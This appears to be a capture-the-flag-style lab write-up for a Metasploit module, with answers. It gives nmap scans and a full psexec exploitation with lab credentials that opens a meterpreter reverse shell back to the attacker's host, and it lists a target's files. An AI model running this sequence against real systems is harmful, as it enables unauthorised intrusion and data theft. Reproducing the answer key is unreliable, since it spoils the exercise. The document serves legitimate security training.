# Automating Payloads & Delivery with Metasploit

## Questions
1. What command language interpreter is used to establish a system shell session with the target? **Answer: Powershell**
2. Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension) **Answer: staffsalaries.txt**
   - Perform a nmap scan for open ports:
    ```
    $ sudo nmap -n -Pn --disable-arp-ping 10.129.201.160
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 16:35 +07
    Nmap scan report for 10.129.201.160
    Host is up (0.29s latency).
    Not shown: 990 closed tcp ports (reset)
    PORT     STATE SERVICE
    7/tcp    open  echo
    9/tcp    open  discard
    13/tcp   open  daytime
    17/tcp   open  qotd
    19/tcp   open  chargen
    80/tcp   open  http
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    2179/tcp open  vmrdp

    Nmap done: 1 IP address (1 host up) scanned in 49.96 seconds
    ```
   - Perform a service detection scan with script for SMB using nmap:
    ```
    $ sudo nmap -sV -sC -p139,445 -Pn 10.129.201.160
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 16:44 +07
    Nmap scan report for 10.129.201.160
    Host is up (0.32s latency).

    PORT    STATE SERVICE      VERSION
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
    Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time:
    |   date: 2025-09-20T09:45:14
    |_  start_date: N/A
    | smb-os-discovery:
    |   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
    |   OS CPE: cpe:/o:microsoft:windows_10::-
    |   Computer name: Shells-Win10
    |   NetBIOS computer name: SHELLS-WIN10\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2025-09-20T02:45:15-07:00
    |_clock-skew: mean: 2h20m03s, deviation: 4h02m32s, median: 1s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled but not required

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 27.08 seconds
    ```
   - In mfsconsole use module `windows/smb/psexec` to exploit the target's SMB service:
    ```
    [msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_upload_asp) >> use exploit/windows/smb/psexec  
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> options

    Module options (exploit/windows/smb/psexec):

    Name                  Current Setting  Required  Description
    ----                  ---------------  --------  -----------
    SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                   no        The service display name
    SERVICE_NAME                           no        The service name
    SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


    Used when connecting via an existing SESSION:

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    SESSION                   no        The session to run this module on


    Used when making a new connection via RHOSTS:

    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT      445              no        The target port (TCP)
    SMBDomain  .                no        The Windows domain to use for authentication
    SMBPass                     no        The password for the specified username
    SMBUser                     no        The username to authenticate as


    Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     213.163.193.81   yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Automatic



    View the full module info with the info, or info -d command.

    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set RHOSTS 10.129.201.160
    RHOSTS => 10.129.201.160
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBUser htb-student
    SMBUser => htb-student
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBPass HTB_@cademy_stdnt!
    SMBPass => HTB_@cademy_stdnt!
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set LHOST 10.10.14.145
    LHOST => 10.10.14.145
    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> exploit
    [*] Started reverse TCP handler on 10.10.14.145:4444 
    [*] 10.129.201.160:445 - Connecting to the server...
    [*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
    [*] 10.129.201.160:445 - Selecting PowerShell target
    [*] 10.129.201.160:445 - Executing the payload...
    [+] 10.129.201.160:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Sending stage (177734 bytes) to 10.129.201.160
    [*] Meterpreter session 1 opened (10.10.14.145:4444 -> 10.129.201.160:49874) at 2025-09-20 05:22:52 -0500

    (Meterpreter 1)(C:\Windows\system32) > dir ../../Users/htb-student/Documents
    Listing: C:\Users\htb-student\Documents
    =======================================

    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    040777/rwxrwxrwx  0     dir   2021-10-16 11:08:05 -0500  My Music
    040777/rwxrwxrwx  0     dir   2021-10-16 11:08:05 -0500  My Pictures
    040777/rwxrwxrwx  0     dir   2021-10-16 11:08:05 -0500  My Videos
    100666/rw-rw-rw-  402   fil   2021-10-16 11:08:07 -0500  desktop.ini
    100666/rw-rw-rw-  268   fil   2021-10-16 15:16:01 -0500  staffsalaries.txt
    ```
    **Note**: when getting the timeout `[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>`, extend the timeout session as follows:
    ```
    (Meterpreter 1)(C:\Users\htb-student) > background
    [*] Backgrounding session 1...
    [msf](Jobs:0 Agents:1) exploit(windows/smb/psexec) >> sessions --interact 1 --timeout 60
    [*] Starting interaction with 1...
    ```